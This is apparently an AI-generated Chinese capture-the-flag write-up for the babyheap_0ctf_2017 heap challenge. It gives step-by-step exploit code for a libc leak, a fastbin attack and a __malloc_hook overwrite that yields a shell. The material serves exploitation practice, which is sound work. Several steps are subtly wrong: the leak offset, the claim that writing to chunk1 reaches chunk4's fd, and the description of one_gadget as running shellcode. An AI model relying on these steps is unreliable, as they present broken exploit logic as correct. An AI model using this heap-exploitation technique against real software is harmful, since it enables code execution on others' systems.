+++
title = "ai wp"
date = "2026-04-01"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-2', '2-2-2']
draft = false
+++
### babyheap_0ctf_2017 详细解析

本题是一道经典的堆利用题目，考察 **fastbin attack** 和 **堆溢出漏洞利用**，程序开启了全部保护（64位、Canary、NX、PIE、Full RELRO）。以下是完整的解题步骤：

---

#### 一、漏洞分析
1. **程序功能**：
   - `Allocate`：申请指定大小的堆块（最大0x1000字节）
   - `Fill`：向堆块写入数据（**存在堆溢出漏洞**）
   - `Free`：释放堆块
   - `Dump`：输出堆块内容

2. **关键漏洞**：
   - `Fill`操作未检查写入长度，可覆盖相邻堆块的头部数据（如`size`字段）
   - 结合堆布局和释放操作可泄露libc地址
   - 通过伪造`fastbin chunk`劫持`__malloc_hook`

---

#### 二、利用步骤
##### 阶段1：泄露libc地址
1. **堆布局**：
   ```python
   alloc(0, 0x10)  # chunk0 (用于溢出)
   alloc(1, 0x10)  # chunk1 (目标块)
   alloc(2, 0x10)  # chunk2 (防止合并)
   alloc(3, 0x80)  # chunk3 (用于泄露libc)
   ```

2. **释放chunk3**：
   ```python
   free(3)  # 进入unsorted bin，fd/bk指向main_arena+88
   ```

3. **溢出修改chunk1的size**：
   ```python
   fill(0, b'A'*0x10 + p64(0) + p64(0x91))  # 覆盖chunk1的size为0x91
   ```
   - 修改后chunk1大小变为0x90，包含chunk3的头部

4. **泄露libc地址**：
   ```python
   dump(1)  # 输出chunk1内容
   leak = u64(p.recv()[0x80:0x88])  # 读取chunk3的fd指针
   libc_base = leak - 0x3c4b78      # libc-2.23中main_arena+88的偏移
   malloc_hook = libc_base + 0x3c4b10
   one_gadget = libc_base + 0x4526a  # 示例gadget偏移
   ```

##### 阶段2：fastbin attack
1. **恢复堆布局**：
   ```python
   alloc(3, 0x80)  # 重新申请chunk3
   alloc(4, 0x60)  # chunk4 (用于fastbin attack)
   alloc(5, 0x10)  # chunk5 (隔离作用)
   ```

2. **准备fastbin链**：
   ```python
   free(4)  # 释放chunk4到fastbin (0x70大小)
   fill(0, b'A'*0x10 + p64(0) + p64(0x71))  # 修改chunk1的size为0x71
   ```

3. **伪造fd指针**：
   ```python
   fake_chunk = malloc_hook - 0x23  # 构造fake chunk (0x7f伪size)
   payload = b'B'*0x10 + p64(0) + p64(0x71) + p64(fake_chunk)
   fill(1, payload)  # 覆盖chunk4的fd指向fake_chunk
   ```

4. **分配伪造块**：
   ```python
   alloc(4, 0x60)  # 取出原chunk4
   alloc(6, 0x60)  # 取出原chunk4的next
   alloc(7, 0x60)  # 分配到fake_chunk (malloc_hook-0x23处)
   ```

5. **覆盖__malloc_hook**：
   ```python
   fill(7, b'\x00'*0x13 + p64(one_gadget))  # 精确覆盖__malloc_hook
   ```

##### 阶段3：触发shell
```python
alloc(8, 0x10)  # 触发malloc执行one_gadget
```
- 成功触发后获得shell权限

---

#### 三、关键技巧
1. **unsorted bin泄露**：
   - 通过修改chunk大小包含已释放块，读取`main_arena`指针
   - 需用隔离块防止合并（如chunk2）

2. **fastbin attack**：
   - 利用`0x7f`伪size绕过检查（malloc_hook-0x23处）
   - 精确计算libc偏移（需匹配题目环境）

3. **堆布局要点**：
   ```c
   chunk0 [0x20] -> 溢出源
   chunk1 [0x20] -> 被修改size
   chunk2 [0x20] -> 隔离块
   chunk3 [0x90] -> 泄露块
   ```

---

#### 四、防护绕过总结
| 防护机制 | 绕过方式 |
|----------|----------|
| **PIE/ASLR** | 通过unsorted bin泄露libc |
| **Full RELRO** | 劫持`__malloc_hook`而非GOT |
| **NX** | 使用one_gadget执行shellcode |
| **堆完整性检查** | 伪造精确的size字段和链表指针 |

: 第一次看到babyheap_0ctf_2017时，完全被它"保护全开"的架势吓到了...
: 题目保护状态：Arch: amd64-64-little, RELRO: Full, Stack: Canary, NX: enabled, PIE: enabled
: 通过堆溢出修改chunk大小实现越界读，是泄露地址的关键
: 需注意不同libc版本的偏移差异，建议使用题目提供的libc
